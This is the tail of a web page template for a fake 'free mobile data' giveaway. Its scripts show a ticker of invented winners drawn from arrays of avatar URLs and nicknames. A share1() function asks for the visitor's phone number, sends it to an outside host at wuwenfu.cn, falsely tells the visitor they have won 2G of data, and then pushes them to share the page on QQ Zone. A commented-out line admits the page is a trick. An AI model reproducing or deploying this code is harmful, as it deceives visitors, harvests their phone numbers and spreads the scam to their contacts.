    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneyMQxEWGO9etribwpib93ozMkthzn2KGbVfhXerWsU6VhJDY1p6JA9aGHyoChkPHFY2YLiaoGIE2Gd0Qf32IVnUFa/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHaf4bKHugJlUyJORBQFXib6T1EyHHPKGuzU9WibyoTME8mYoGMicRMYicicsdF5s9HZRygxrtsSPpzfuFIJ2emYMSW2r/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlibK27FKibbDCpcyOAm5Fq0icUFvPNttorK3xZznHEDOpziaKMgiaLicFsOFj1KTLSss72JELpoCpibGSlOjQibwqiaaLxPK/96',
    'http://wx.qlogo.cn/mmopen/ajNVdqHZLLBZ0q8N3wBlQj6QibMRSgkHT3K0nribHBiaMw3888l5fqOcGJskibvCGgjYq5iaHFpW0pqsvOjUHdbsd6A/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlibY5jsiaicbsSSicicIJJaDP6gtxicQrXudVQs3UbWubicy4WNiaNd8Uua6XWpO1jsJq8vFrQvUrJtNbSBcjw70jeG7ubN/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcvnIRrqysgYWsp9SAAco0vBXtynKczGtiam0gJ1pz5ZvbELaiaX0rwGkaPMwg9yd8cne0JUrpAp1Oe/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHblCyVfsh6trG4M3AsR9HR4qgZv8h1LMThHRA1s0wwQAoVoeBGpRJy3PAw4RDs8Tm5uXOQ1cucrGSZQwZa2KnXP/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ5x0XyoPBKXpSMicOnCaia4yHPvFTIPeaj10ic5fLpxqDE6ZibNcEYJ2qicfWLN0I5bMODtVibzmVc7vq5biaNRpVzbznv/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WnfHHsYtGMllwcMcPcSsEZnyfvOzSeNEibasNJHhH1Qia2ZDEhWib8dNbImZnZGFLb9Z1g9OXSY8J11s6Qq70BpnSoo/96',
    'http://wx.qlogo.cn/mmopen/PiajxSqBRaEKfv6SwrzPVicSvwPdl8ZP6Tx01koxSuTib7b7kNb27tZyicXufMx6EP8p0ejf7KibgrvZ37ib0l7rdstg/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oKiccFkKufc710TSia6u98jKSOelW0X3u2HSgzNTCGia6UicwQpVD6jXngBkuBItFThlZk87cx7ibHqTqW/96',
    'http://wx.qlogo.cn/mmopen/ajNVdqHZLLBZ0q8N3wBlQj6QibMRSgkHT3K0nribHBiaMw3888l5fqOcGJskibvCGgjYq5iaHFpW0pqsvOjUHdbsd6A/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedSadeKOpxeCGqkKvH4KicP8ibvexd4QcYZI8yGzXNAQ5iaIU0sgFRkReDVibkrZiaS6K86qm0rhZZp5aj/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ5Qjkwx80T1U7BFeuGzn3Z0JJ7W7sFnY6icjCLANVRIeI0k4UZTKccGHnKu4ypHCFQY6050YC2hSjy3PibRUvl9G1/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneiaicfkPHjkZFiccS3dsC5pXj67viafXMqRYxjmfBiaYl2lgicibJgzRBzXEWMAFnJ8W08tHr66xqGYCmSN4RJic6Zm360/96',
    'http://wx.qlogo.cn/mmopen/CpCibtib23t5CicZFK9jGz9cLrCbL4JNBc7TPs0OasS411m6OVbkM3NU8yd5CXtxicdsTjfTvkabw7nhGZE99vLnHxw821xpEBvb/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedcpaVOXYkha8vF9p7YvS03E09QbZQxTRTokQ6lfrgZD2Cm0NxdzjPwLKo7nb23I3L1jcOypNkzq4/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcurs6t5Os1dG5BzViaUhvj5LZIgy57Fsjy8icfZvkv8Q8hHVJGFRxnksicxlLQ9D2h1QTLmTyTZmU5E/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oKibPL8FNJY3N2G0FqOKqibwia4AYgAKGsNjGcOZ73WkE0iasJ06sHHoYcNoLUkR7x0dicyEZgGrKEFh39/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK6dJv6Eic0kpbaW3YxGib2hVZnFnoQWouqehnQ3zSg15KicdqdI6DMdiaibA3ANQ5U4fXDFiaXl3wZNQA1/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZctvGQtXkl6iavd4hG9uJ5yayzMh8YKoR24DZGNY2xyXu2mRaRCUL49FUiaRsYe10z4crQmeBS4icWyS/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ4OibfqPuoeDMGl8KflcXgUeK6yCH00oeSMrbYXpyBPICwNDuvA0DIzswibb8gD0v0IhnXDZOwu0EzzbnjrI4uzibQ/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK8lvicArHZUiabgFfkcT0Ua1bzM3KsN0awqaTrKQib8Gndpn1ibx5fsiaAfmAicmv82YGogoDBbNqJaibzG/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedX4sykRv7TAgylicAadymu6aPYV8k5hibRhvHjKv2hhtNEzE6ZbML6LmoulgbnvCSzqf8BMvRXODN8/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHZQmicSeZiayv4iacRywULiaVM9r8Dymvc8ia4ESBBTwT9ZZyu4ViaNLczcoBUyv2auNMhhxhZmib0zt6dlKXUMwhchhL2/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAl9Px1zpjkpH8q23d4GqwV2ficcyMORJjkwoYERasgXtvTmDicibtDBItQeQ89ibQBkA5JN4O8TibbsVVw0IvNSrnRfOK/96',
    'http://wx.qlogo.cn/mmopen/CpCibtib23t5DsyRo8hHuxb9TpICvgS8UB9FQicic2mjacpxIjc17js6WhmLNnWTibibW3mCMqj3GakULnEjPNeTvrG2K9mzOM6OEq/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcgApJ9yyKsvfPcsjw8WcbkAWYZ2JhFQ9mObJBkl78DE5xV4OC0Nd7Fn50JJqKicbbwFib8ymBkY4W7/96',
    'http://wx.qlogo.cn/mmopen/ajNVdqHZLLD7107Biackz45xD0tOT5EIhsyicc9uK9nFd0otQoKUcIMXysqyJ4EMKOSRicVuYOCY0eGk6W3n6keSJrLSzXjhy8am5dPT3yQpnk/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedYjia67IXpp74nS3XaF5QJpibOmDbtHuM24ywypBTb3FILcZy0Dbb17lJBaQC6puZQMpYBiarnuFDZM/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ6q2l4332xf9vwcxYTFSUVFWpicIDicIPNTzjmkicmgibw5XsLcLMVKS3EwUrYuiakMEslGUUhibjibzlI2xm4TurL0q9u/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4Wnc1W5krR5JOQ50AgF4lASm4hgoxMcEvpicqiau6jTpYMCxRI2I3WJ3fhb1f8bguDIUbd0xSH0ribnArGf5amuWZvcb/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneLoBuBh55KOSCjickSOfK2EZdSYBNc1ibgicUtLl5KQ2EZlz1yALrPlrP2NJSt1W6TibYhJ43uWGkgNQ/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneyMQxEWGO9etribwpib93ozMkthzn2KGbVfhXerWsU6VhJDY1p6JA9aGHyoChkPHFY2YLiaoGIE2Gd0Qf32IVnUFa/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHYqftZbQ3FOEKRgcLK3sO7ickheADdxfrQ0tA9p1GcOeicYD6C8TxwCt9wyzvhCpuqCpQbibFaeicYyDGstiaeYMKmcp/96'
);

var gundong_name = new Array(
    '彭先森用',
    '少司命',
    '☞公mthongbao',
    '阿迪姐姐.',
    '朋友',
    '新天亿官方',
    '薇信(APP44B)',
    '雨若无痕',
    '無邪気',
    '加.薪.號ny46kt',
    '素雅',
    '赚客帮小雄',
    '专属§味道',
    '烟花、绽放过后只剩黑暗',
    '阿静',
    'uan551618',
    '☞☞268630',
    '辰锦网络传媒。',
    '唐浩',
    '4345687',
    '巨花魔芋',
    '^_^尾巴',
    '天使^_^',
    '叫我王翔就好了。',
    '梦雪儿',
    '屁屁屁',
    '十五',
    '真性情',
    '✎﹏ℳ๓﹏恋ღ',
    '红包总裁',
    '兔子样?',
    '小姑凉',
    '【古风】',
    '青山',
    '东方',
    '滨州孙杰',
    '火爆捡钱',
    'A今天',
    '小彩',
    'Vroo',
    '李23',
    '日照孙磊',
    'aerla',
    '巧巧',
    'xuan',
    '嗯',
    '十一年',
    '彭先森',
    '莫小琳',
    '朋友',
    '谢明',
    '范二小超人?',
    '☞ongbao',
    '艾特',
    '丽丽',
    '创造机遇?',
    '少司命我的女神',
    '林佳鹏',
    'suc0000',
    'Q100773',
    '兔子样?',
    '小姑凉',
    '彭先亚',
    '【古风】',
    '我的女神',
    '满天红包☞',
    '东方',
    '朋友',
    'aerla',
    '滨州孙杰',
    '十一年',
    '阿迪姐姐.',
    '范二小超人?',
    '巧巧',
    'Vroo',
    '青山',
    'A今天',
    '莫小琳',
    '嗯',
    '日照孙磊',
    'huan888',
    '雨若无痕',
    '小彩',
    '满天飞☞☞4268630',
    'xuan',
    '李23',
    '新天亿官方',
    'waldenpond',
    '艾特',
    '思思'
);

function fenzhong() {
    var fen = GetRandomNum(0, 60);
    if (fen < 10) {
        fen = '0' + fen;
    }
    return fen;
}

function xiaoshi() {
    var fen = GetRandomNum(0, 24);
    if (fen < 10) {
        fen = '0' + fen;
    }
    return fen;
}
function touxiang() {
    var url = gundong_touxiang[GetRandomNum(0, gundong_touxiang.length - 1)];
    return url;
}
function xianshiname() {
    var realname = gundong_name[GetRandomNum(0, gundong_name.length - 1)];
    return realname;
}

var chouzhongjiangping = new Array(
    '5M流量已领取到账!',
    '10M流量已领取到账!',
    '50M流量已领取到账!',
    '100M流量已领取到账!',
    '500M流量已领取到账!',
    '700M流量已领取到账!',
    '1G流量已领取到账!',
    '2G流量已领取到账!'
);

function xianshichouzhong() {
    var chouzhong = chouzhongjiangping[GetRandomNum(0, chouzhongjiangping.length - 1)];
    return chouzhong;
}
</script>


<div class="box-user">
    <div class="box-user-wrap" id="box-user-wrap">


        <script>
            for(var i=0;i<12;i++){
                document.write('<div class="box-item fadeInUp fadeOutUp" id="box-item'+i+'" style="display: none"><span class="avatar"><img src="'+touxiang()+'"></span><p><span class="nickname" style="color: #ffff00">'+xianshiname()+'&nbsp;&nbsp;</span>抽中了'+xianshichouzhong()+'</p></div>')
            }
        </script>

    </div>
</div>

<div style="width: 100%;height: 150px"></div>



</body>
</html>


<script>
    function getCookie(name) {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");

        if (arr = document.cookie.match(reg))

            return unescape(arr[2]);
        else
            return null;
    }
    if(getCookie('name')>=100){                                        //次数
//        location.href='http://s.click.taobao.com/7YfFvlx';            //5次后跳转的地址
    }

    if(getCookie('ti')=='yes'){
        share();
    }

    function setCookie(name, value) {
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
    }
    function share() {
        {$('body').append('<div class="share">\
      <a href=\"javascript:;\" onClick=\"share1()\"><img src="<?php bloginfo('template_url'); ?>/freeflow/2.jpg" /></a>\
      <div class="clear"></div>\
    </div>');
        }

    }
    function share1() {
        var age=prompt("请输入你的手机号码以便发送奖品:");
        if (age!=null)
        {
            //这里存储一次手机号码。
            var myreg = /^(((13[0-9]{1})|(15[0-9]{1})|(18[0-9]{1}))+\d{8})$/;
            if(!myreg.test(age))
            {
                alert('请输入有效的手机号码！');
                return false;
            }
            $.get('http://wuwenfu.cn?add_phone='+age);


alert("恭喜你，获得了2G流量，请分享到qq空间，稍后会自动收到流量的短信通知！")
//            alert('恭喜你，上当了。这只是一个测试页面。我叫吴文付,一名程序员。如果看到这个，请分享到空间，看你的朋友是否也会上当。可以加qq群与我沟通 176978149');
//            location.href='./suiji.php';
            //这里要进行分享操作。
//            var sharebtn = document.getElementsByClassName("jiathis_button_qzone")[0];
//            sharebtn.click();
            var btn = document.getElementById('qqshare');
            btn.style.display="block";
            //3秒后关闭
            var t=setTimeout("closeimg()",2000)


        }
    }
    function di3(){
        if (!getCookie('name')) {
            setCookie('name', 1)
        } else {
            var nowcookie = getCookie('name');
            var newcookie = nowcookie - 1 + 2;
            setCookie('name', newcookie);
        }
    }

    function closeimg(){
        var btn = document.getElementById('qqshare');
        btn.style.display ="none";
    }

    di3();

    function zadancishu(){
        if (!getCookie('zadancishu')) {
            setCookie('zadancishu', 1)
        } else {
            var nowcookie = getCookie('zadancishu');
            var newcookie = nowcookie - 1 + 2;
            setCookie('zadancishu', newcookie);
        }
    }

    function di2(){

        setCookie('ti', 'yes');
    }


    function GetRandomNum(Min, Max) {
        var Range = Max - Min;
        var Rand = Math.random();
        return (Min + Math.round(Rand * Range));
    }


</script>



<style>
    .share {
        position: fixed;
        top: 0;
        left: 0;
        z-index: 1000;
        width: 100%;
        height: 100%;
        color: #fff;
        font: 14px/30px "榛戜綋";
        /*14px/30px "榛戜綋"*/
        background: rgba(0, 0, 0, .75);
    }

    .share img {
        float: right;
        width: 100%;
        margin: 10px;
    }

    .share p {
        padding: 0 10px;
    }

    .tr {
        text-align: right;
    }
</style>

</div>

<script type="text/javascript" src="http://tajs.qq.com/stats?sId=52332918" charset="UTF-8"></script>

<!--<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1256714355'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1256714355' type='text/javascript'%3E%3C/script%3E"));</script>-->
</div>